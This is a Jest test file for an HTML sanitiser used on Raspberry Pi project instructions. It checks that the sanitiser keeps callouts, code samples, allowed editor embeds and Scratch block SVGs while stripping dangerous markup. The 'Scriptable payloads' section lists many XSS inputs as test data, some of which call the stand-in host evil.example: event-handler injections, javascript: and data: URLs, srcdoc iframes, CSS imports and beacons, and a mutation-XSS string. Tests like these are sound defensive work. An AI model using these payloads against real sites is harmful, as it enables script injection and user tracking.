import { processEditorProject } from "@raspberrypifoundation/rpf-markdown-core";
import sanitiseInstructions from "./sanitiseInstructions";

const parse = (html) => {
  const container = document.createElement("div");
  container.innerHTML = sanitiseInstructions(html);
  return container;
};

const eventHandlerAttributes = (container) =>
  Array.from(container.querySelectorAll("*")).flatMap((element) =>
    Array.from(element.attributes)
      .map((attribute) => attribute.name)
      .filter((name) => name.startsWith("on")),
  );

describe("Scriptable payloads", () => {
  const payloads = {
    "script element": "<script>window.hacked = true</script>",
    "script src": '<script src="https://evil.example/x.js"></script>',
    "img onerror": '<img src="x" onerror="window.hacked = true">',
    "svg onload": '<svg onload="window.hacked = true"></svg>',
    "body onload": '<body onload="window.hacked = true">text</body>',
    "details ontoggle":
      '<details open ontoggle="window.hacked = true">x</details>',
    "unknown element with handler":
      '<xss id="x" tabindex="1" onfocus="window.hacked = true"></xss>',
    "javascript href": '<a href="javascript:window.hacked = true">click</a>',
    "javascript href with entities":
      '<a href="java&#115;cript:window.hacked = true">click</a>',
    "data url href":
      '<a href="data:text/html;base64,PHNjcmlwdD53aW5kb3cuaGFja2VkPXRydWU8L3NjcmlwdD4=">click</a>',
    "form action":
      '<form action="javascript:window.hacked = true"><button>go</button></form>',
    "formaction button":
      '<button formaction="javascript:window.hacked = true">go</button>',
    "third party iframe": '<iframe src="https://evil.example/x"></iframe>',
    "iframe srcdoc":
      '<iframe srcdoc="<script>window.hacked = true</script>"></iframe>',
    "allowed origin iframe with srcdoc":
      '<iframe src="https://editor.raspberrypi.org/en/embed/viewer/x" srcdoc="<script>window.hacked = true</script>"></iframe>',
    object: '<object data="javascript:window.hacked = true"></object>',
    embed: '<embed src="https://evil.example/x.swf">',
    "meta refresh":
      '<meta http-equiv="refresh" content="0;url=https://evil.example">',
    base: '<base href="https://evil.example/">',
    "link stylesheet":
      '<link rel="stylesheet" href="https://evil.example/x.css">',
    "style element": "<style>.project-instructions { display: none }</style>",
    "style import": "<style>@import url(https://evil.example/x.css)</style>",
    "svg style with an import":
      "<svg><style>@import url(https://evil.example/x.css)</style></svg>",
    "svg style loading an external image":
      "<svg><style>.sb-label { background: url(https://evil.example/beacon.png) }</style></svg>",
    "external svg use":
      '<svg><use href="https://evil.example/x.svg#y" /></svg>',
    "svg use with an external xlink:href":
      '<svg><use href="#ok" xlink:href="https://evil.example/icon.svg" /></svg>',
    template: "<template><script>window.hacked = true</script></template>",
    noscript:
      '<noscript><p title="</noscript><img src=x onerror=window.hacked=true>">',
    "mutation xss":
      '<math><mtext><table><mglyph><style><!--</style><img title="--><textarea onfocus=window.hacked=true autofocus>"></mglyph></table></mtext></math>',
  };

  test.each(Object.entries(payloads))("%s renders inert", (_name, payload) => {
    const container = parse(payload);
    const html = container.innerHTML;

    expect(container.querySelector("script")).toBeNull();
    expect(container.querySelector("style")).toBeNull();
    expect(container.querySelector("iframe[srcdoc]")).toBeNull();
    expect(
      container.querySelector("object, embed, link, base, meta"),
    ).toBeNull();
    expect(eventHandlerAttributes(container)).toEqual([]);
    expect(html).not.toMatch(/javascript:/i);
    expect(html).not.toMatch(/data:text\/html/i);
    expect(html).not.toMatch(/evil\.example/i);
  });

  test("Strips scriptable payloads written as markdown", () => {
    const container = parse(
      processEditorProject(
        "[click](javascript:alert)\n\n<script>window.hacked = true</script>\n",
      ),
    );

    expect(container.querySelector("script")).toBeNull();
    expect(container.querySelector("a")).not.toBeNull();
    expect(container.querySelector('a[href^="javascript:"]')).toBeNull();
  });
});

describe("Embedded project viewers", () => {
  const embed = (src) =>
    `<iframe src="${src}" width="600" height="600" frameborder="0" marginwidth="0" marginheight="0" allowfullscreen></iframe>`;

  test.each([
    "https://editor.raspberrypi.org/en/embed/viewer/editor-mapping-data-step-2",
    "https://staging-editor.raspberrypi.org/embed/viewer/fruit-face-example?show_visual_tab=true",
  ])("Keeps the embed at %s", (src) => {
    const iframe = parse(embed(src)).querySelector("iframe");

    expect(iframe).not.toBeNull();
    expect(iframe.getAttribute("src")).toEqual(src);
    expect(iframe.getAttribute("width")).toEqual("600");
    expect(iframe.getAttribute("allowfullscreen")).not.toBeNull();
  });

  test.each([
    "https://evil.example/x",
    "https://editor.raspberrypi.org.evil.example/x",
    "//evil.example/x",
    "/en/embed/viewer/x",
  ])("Removes the embed at %s", (src) => {
    expect(parse(embed(src)).querySelector("iframe")).toBeNull();
  });

  test("Removes relative embeds when the page is on an allowed origin", () => {
    window.jsdom.reconfigure({
      url: "https://editor.raspberrypi.org/en/projects/foo",
    });

    expect(
      parse(embed("/en/embed/viewer/x")).querySelector("iframe"),
    ).toBeNull();
    expect(
      parse(embed("//editor.raspberrypi.org/en/embed/viewer/x")).querySelector(
        "iframe",
      ),
    ).toBeNull();
  });
});

describe("Project site content", () => {
  test("Keeps callouts, task checkboxes and headings", () => {
    const container = parse(
      '<h2 class="c-project-heading--task" id="step-1">Step 1</h2>' +
        '<div class="c-project-callout c-project-callout--tip" style="font-size: 1.1em">' +
        '<h3 id="tip">Tip</h3></div>' +
        '<div class="c-project-task">' +
        '<input class="c-project-task__checkbox" type="checkbox" aria-label="Mark this task as complete" />' +
        "</div>",
    );

    expect(container.querySelector("h2.c-project-heading--task").id).toEqual(
      "step-1",
    );
    expect(
      container.querySelector(".c-project-callout--tip").getAttribute("style"),
    ).toEqual("font-size: 1.1em");
    expect(container.querySelector("h3#tip")).not.toBeNull();
    expect(
      container
        .querySelector('input[type="checkbox"]')
        .getAttribute("aria-label"),
    ).toEqual("Mark this task as complete");
  });

  test("Keeps the attributes the syntax highlighter relies on", () => {
    const container = parse(
      '<pre dir="ltr" class="line-numbers" data-start="10" data-line-offset="10" data-line="11">' +
        '<code class="language-python" dir="ltr">print(&#39;Hello&#39;)</code></pre>',
    );

    const pre = container.querySelector("pre");
    expect(pre.getAttribute("data-line")).toEqual("11");
    expect(pre.getAttribute("data-start")).toEqual("10");
    expect(pre.getAttribute("data-line-offset")).toEqual("10");
    expect(pre.getAttribute("dir")).toEqual("ltr");
    expect(container.querySelector("code.language-python").textContent).toEqual(
      "print('Hello')",
    );
  });

  test("Keeps images and links", () => {
    const container = parse(
      '<p><img src="https://projects-static.raspberrypi.org/projects/x/images/y.png" alt="A screenshot" width="300" /></p>' +
        '<a href="https://projects.raspberrypi.org/en/projects/x" target="_blank">Link</a>',
    );

    expect(container.querySelector("img").alt).toEqual("A screenshot");
    expect(container.querySelector("a").getAttribute("target")).toEqual(
      "_blank",
    );
  });

  test("Keeps code samples that contain HTML", () => {
    const container = parse(
      '<pre><code class="language-html">&lt;script&gt;alert(1)&lt;/script&gt;</code></pre>',
    );

    expect(container.querySelector("script")).toBeNull();
    expect(container.querySelector("code").textContent).toEqual(
      "<script>alert(1)</script>",
    );
  });
});

describe("Scratch blocks", () => {
  const scratchblocksHtml = processEditorProject(
    "```blocks\nwhen green flag clicked\nsay [Hello] for (2) seconds\n```\n",
  );

  test("Keeps the rendered SVG, its stylesheet and its icons", () => {
    const container = parse(scratchblocksHtml);

    const svg = container.querySelector("svg");
    expect(svg).not.toBeNull();
    expect(svg.querySelector("style")).not.toBeNull();
    expect(svg.querySelectorAll("use").length).toBeGreaterThan(0);
    expect(svg.querySelector("use").getAttribute("href")).toMatch(/^#/);
  });

  test("Keeps a stylesheet inside an SVG, unless it loads CSS from outside", () => {
    const kept = parse(
      "<svg><style>.sb-bevel { filter: url(#bevelFilter) }</style></svg>",
    );
    const removed = parse(
      "<svg><style>@import url(https://evil.example/x.css)</style></svg>",
    );

    expect(kept.querySelector("svg style")).not.toBeNull();
    expect(removed.querySelector("style")).toBeNull();
  });

  test("Keeps the block markup the editor renders client side", () => {
    const container = parse(
      '<pre><code class="language-blocks">when green flag clicked</code></pre>',
    );

    expect(container.querySelector("code.language-blocks").textContent).toEqual(
      "when green flag clicked",
    );
  });
});

describe("When there is nothing to sanitise", () => {
  test.each([undefined, null, ""])("Returns an empty string for %s", (html) => {
    expect(sanitiseInstructions(html)).toEqual("");
  });
});
